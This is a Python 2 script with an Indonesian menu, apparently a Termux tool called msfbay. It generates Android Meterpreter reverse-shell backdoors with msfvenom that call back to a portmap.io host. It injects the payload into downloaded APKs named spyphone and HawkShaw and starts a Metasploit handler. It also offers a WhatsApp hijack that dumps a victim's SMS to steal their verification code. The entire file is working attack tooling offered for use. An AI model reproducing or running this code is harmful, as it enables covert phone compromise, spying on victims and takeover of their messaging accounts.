# -*- coding: utf-8 -*-

import os, sys
import time
import random

putih="\x1b[1;97m"
merah="\x1b[1;91m"
hijau="\x1b[1;92m" 
red= '\033[91m'
orange= '\33[38;5;208m'
green= '\033[92m'
cyan= '\033[36m'
bold= '\033[1m'
end= '\033[0m'

def flush(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(random.random() * 0.01)

def out():
	exit()
	
def back():
	raw_input('\n\x1b[1;91m					[ \x1b[1;97mBack \x1b[1;91m]')
	home()
	
def nxt():
	raw_input('\n\x1b[1;91m					[ \x1b[1;97mNext \x1b[1;91m]')

os.system("clear")
confirm =raw_input(putih+'SUDAH PUNYA AKUN PORTMAP.IO ? y/n : ')
if confirm== 'y':
  os.system('clear')
else :
  if confirm== 'n':
    print '' 
    print 'buat akun portmap.io dulu'
    print '' 
    os.system('termux-open https://portmap.io')
    time.sleep(1)
    exit()
  else :
    if confirm== ' ':
      os.system('python2 msfbay.py')
    else :
      os.system('python2 msfbay.py')
      
confirm=raw_input('SUDAH AKTIFKAN OPENVPN ?  y/n : ')
if confirm== '' :
	os.system('python2 msfbay.py')
else :
	if confirm== 'y' :
		print ' '
	else :
		if confirm== 'n' :
			os.system('clear')
			print 'anda harus mengaktifkan OpenVPN untuk melanjutkan'
			time.sleep(2)
			os.system('am start --user 0 -n net.openvpn.openvpn/net.openvpn.unified.MainActivity')
		else :
			os.system('clear')
			print 'Konfirmasi Salah!'
			time.sleep(3)
			os.system('clear')
			exit()

def payload():
	os.system("clear")
	logo()
	print "\x1b[1;97mAmbil \x1b[1;91m5 Digit angka \x1b[1;97mSetelah TAnda (:)"
	print "Contoh Menggunakan Config Saya"
	print "tcp://bayPort-44026.portmap.io:\x1b[1;91m44026"
	print "                                     \x1b[1;91m^"
	print "----------------------------------------------"
	lp=raw_input("Port : ")
	if lp== ' ' :
		print 'Harus Diisi'
		payload()
	else :
		print ' '
	print "\x1b[1;97mMasukan LHOST"
	print "Contoh Menggunakan Config Saya"
	print "\x1b[1;91mbayPort-44026.portmap.io"
	print "\x1b[1;91m                 ^"
	print "----------------------------------------------"
	lh=raw_input("lhost : ")
	if lh== ' ' :
		print 'Harus Diisi'
	else :
		print ' '
	print hijau+'PLEASE WAIT 5 - 20 Minutes...'
	os.system("msfvenom -p android/meterpreter/reverse_tcp lhost="+str(lh)+" lport="+str(lp)+" -o Malware/payload.apk")
	
def hawkshaw():
	os.system("wget https://github.com/baybae/Malware/raw/main/HawkShaw.apk && mv -f HawkShaw.apk Malware/a.apk")
	os.system("cd Malware && rm -rf payload.apk p a")
	os.system("cd Malware && apktool d a.apk -o a")
	os.system("rm -rf Malware/a.apk")
	payload()
	os.system("cd Malware && apktool d payload.apk -o p")
	os.system("rm -rf Malware/a/smali/com/metasploit/stage")
	os.system("mv -f Malware/p/smali/com/metasploit/stage Malware/a/smali/com/")
	os.system("cd Malware && apktool b a -o a.apk")
	os.system("cd Malware && rm -rf payload.apk p a")
	os.system('mv -f Malware/a.apk /storage/emulated/0')
	os.system('am start --user 0 -n com.haibison.apksigner/app.activities.MainActivity')

def spyphone():
	os.system("wget https://github.com/baybae/Malware/raw/main/spyphone.apk && mv -f spyphone.apk Malware/spyphone.apk")
	os.system("cd Malware && rm -rf payload.apk payload spyphone")
	os.system("cd Malware && apktool d spyphone.apk -o spyphone")
	os.system("rm -rf Malware/spyphone.apk")
	payload()
	os.system("cd Malware && apktool d payload.apk -o payload && cd ")
	os.system("rm -rf Malware/spyphone/smali/com/metasploit/stage")
	os.system("mv -f Malware/payload/smali/com/metasploit/stage Malware/spyphone/smali/com/metasploit/")
	os.system("cd Malware && apktool b spyphone -o spyphone.apk")
	os.system("cd Malware && rm -rf payload.apk payload spyphone")
	os.system('am start --user 0 -n com.haibison.apksigner/app.activities.MainActivity')
	os.system('mv -f Malware/spyphone.apk /storage/emulated/0/')
		
def extract_wa():
	os.system('clear')
	logo()
	time.sleep(1)
	flush('Buka Aplikasi GBWhatsApp') 
	flush('kemudian Login dengan nomor Target')
	nxt()
	print hijau
	flush(merah+'[!]'+hijau+' Anda akan memasuki mode meterpreter')
	flush(merah+'[!]'+hijau+' pastikan Backdoor') 
	flush('    dan OpenVPN telah aktif')
	flush(merah+'[!]'+hijau+' Ambil Kode Verifikasi Target')
	flush('    Dan database target')
	flush(merah+'[!]'+hijau+' Gunakan Command')
	print cyan
	flush('    dump_sms	')
	flush('    download {database}')
	nxt()
	flush(hijau+'Membuka Msfconsole ... ')
	remote()
	logo()
	flush(putih+'Buka link Verifikasi')
	flush('Untuk Meretas akun Target')
	flush('Jika link tidak Muncul, ulangi dump_sms')
	print putih+'---------------------------------------------------'
	print cyan
	os.system('cat *txt | grep -o [a-z.]*/[0-9][0-9][0-9][0-9][0-9][0-9] > link.txt')
	os.system('chmod +x link.txt')
	f= open("link.txt")
	if f.mode == "r":
		T = f.readlines()
		os.system("echo https://"+str(T)+" > t.txt")
		os.system('cat t.txt |grep https:// > v.txt')
		g = open('v.txt')
		for line in g:
			line = line.replace("[", "")
			os.system('echo  '+str(line)+' > y.txt')
		g.close
		os.system('cat y.txt')
	f.close
	back()

def awal():
	malware()
	pilmal()
	
def pilmal():
	zedd = raw_input('╚═\x1b[1;91m▶\x1b[1;97m ')
	if zedd == '':
		os.system('clear')
		home()
	else:
		if zedd == '1':
			spyphone()
		elif zedd == '2':
			hawkshaw()
		else:
			print '\x1b[1;91m[!] pilihan salah'
			os.system('clear')
			awal()
    
def malware():
    os.system('clear')
    logo()
    os.system('figlet Malware |lolcat')
    print '\x1b[1;91m1.\x1b[1;97mSpyphone'
    print '\x1b[1;91m2.\x1b[1;97mHawkshaw '
    print '\r\x1b[1;91m__________________________________________«Back» '

def logo():      
	f = open('Baner/asci')
	print merah+f.read()
	f.close
	print '---------------------------------------------------'
	print cyan+' Author  : '+green+'Bayu Setiono {baybae}   '
	print cyan+' Github  : '+green+'https://github.com/baybae/msfbay '
	print cyan+' Youtube : '+green+'baybae                     '
	print putih+'---------------------------------------------------'
	print ''

def remote():
    os.system("clear")    	
    logo()
    os.system('rm -rf ip.txt')
    os.system('ifconfig > ip.txt')
    f = open('ip.txt')
    g = merah+f.read()
    print '' 
    print g
    f.close
    print putih+'Jika Tun0 diatas kosong, Aktifkan OpenVPN'
    print "\x1b[1;91m----------------------------------------------"
    print " Masukan IP tun0 inet: "
    lh =raw_input(" LHOST : ")
    if lh== '':
      print merah+"[!] Harus DiIsi"
      time.sleep(1)
      os.system("clear")
      remote()
    print "\x1b[1;97mMasukan LPORT"
    print "contoh"
    print "tcp://bayPort-44026.portmap.io:44026 =>\x1b[1;91m443"
    print "\x1b[1;91m                                            ^"
    print "----------------------------------------------"
    lp =raw_input("LPORT : ")    
    if lp== '':
      print "[!]Harus DiIsi"
      time.sleep(1)
      os.system("clear")
      remote()
    else :
      os.system("clear")
      os.system("msfconsole -x 'use exploit/multi/handler;set payload android/meterpreter/reverse_tcp;set LHOST "+str(lh)+";set LPORT "+str(lp)+";exploit; sessions -k 1-5'");
      raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
      os.system('clear')

def sisip():
    awal() 
    time.sleep(3)
    raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
    home() 

def update():
	os.system('clear')
	os.system('git stash && git pull origin master')
	os.system('python2 install.py')
	raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
	home()

def baru():
    os.system('clear')
    logo()
    name=raw_input("Name : ")  
    print "\x1b[1;97mAmbil \x1b[1;91m5 Digit angka \x1b[1;97mSetelah TAnda (:)"
    print "Contoh Menggunakan Config Saya"
    print "tcp://bayPort-44026.portmap.io:\x1b[1;91m49015" 
    print "                                     \x1b[1;91m^"
    print "----------------------------------------------"
    port=raw_input("Port : ") 
    print "\x1b[1;97mMasukan LHOST"
    print "Contoh Menggunakan Config Saya"
    print "\x1b[1;91mbayPort-44026.portmap.io" 
    print "\x1b[1;91m                 ^"
    print "----------------------------------------------"
    lh=raw_input("lhost : ")
    os.system('clear')
    print hijau+"[*] GENERATE BACKDOOR \n"
    os.system("msfvenom -p android/meterpreter/reverse_tcp LHOST="+lh+" LPORT="+port+" -o "+name+".apk")
    time.sleep(4)
    os.system('mv '+str(name)+'.apk /storage/emulated/0/')
    time.sleep(4)
    os.system('am start --user 0 -n com.haibison.apksigner/app.activities.MainActivity')
    raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
    home()

def menu():
    os.system('clear')
    time.sleep(1)
    logo()
    print '\x1b[1;91m1.\x1b[1;97mSisipkan Bacdoor '
    print '\x1b[1;91m2.\x1b[1;97mBuat Backdoor Baru        '
    print '\x1b[1;91m3.\x1b[1;97mRemote Android'
    print '\x1b[1;91m4.\x1b[1;97mHack akun Whatsapp'+cyan+' *New'
    print '\x1b[1;91m5.\x1b[1;97mUpdate--'
    print '\x1b[1;91m6.\x1b[1;97mExit'
    print '\r\x1b[1;91m__________________________________________«» '

def pilih():
    zedd = raw_input('╚═\x1b[1;91m▶\x1b[1;97m ')
    if zedd == '':
        print '\x1b[1;91m[!] Can\'t empty'
        time.sleep(1)
        os.system('clear')
        home()
    else:
        if zedd == '1':
            sisip()
        else:
            if zedd == '2':
                baru()
            else:
              if zedd == '3':
                remote()
                home()
              else:
				  if zedd == '4':
					extract_wa()
				  else:	
					 if zedd == '5':
					   update()
					 else:
					   print 'ok'
					   if zedd == '6':
					     exit()
					   else:
					     print '\x1b[1;91m[!] Pilih 1-6'
					     os.system('clear')
					     home()

def home():
	menu()
	pilih()         

home()
